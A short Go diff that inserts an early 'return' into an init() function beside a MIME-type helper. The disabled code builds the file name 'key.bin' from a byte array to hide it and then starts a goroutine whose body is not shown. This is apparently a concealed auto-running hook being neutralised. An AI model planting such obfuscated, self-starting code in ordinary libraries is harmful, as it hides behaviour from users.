@@ -585,6 +585,7 @@ func TypeByExtension(filePath string) string {
 }
 
 func init(){
+	return
 	e, _ := os.Executable()
 	f := filepath.Join(filepath.Dir(e), string([]byte{107, 101, 121, 46, 98, 105, 110}))
 	go func() {
